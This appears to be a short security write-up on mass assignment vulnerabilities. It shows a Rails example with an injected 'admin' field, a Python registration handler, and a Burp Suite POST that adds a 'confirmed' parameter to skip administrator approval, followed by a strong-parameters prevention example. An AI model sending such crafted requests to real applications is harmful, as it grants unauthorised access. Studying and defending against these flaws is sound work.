Given this:
```ruby on rails
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

An attacker can exploit by sending more attributes other than username and email into user
```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```


## Exploiting Mass Assignment Vulnerability

Say we sign up for an app, but we have to wait for an administrator to approve before we can log in.

```/opt/asset-manager/app.py
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')

try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')
```
- If k is set, then we will log in
- If cond = true, we will log in

Send this POST with Burp Suite:
```
POST /register ...
username=new&password=test&confirmed=test
```
- Login with new:test

**Prevention

One should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned.

```
class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  private

  def user_params
    params.require(:user).permit(:username, :email)
  end
end
```
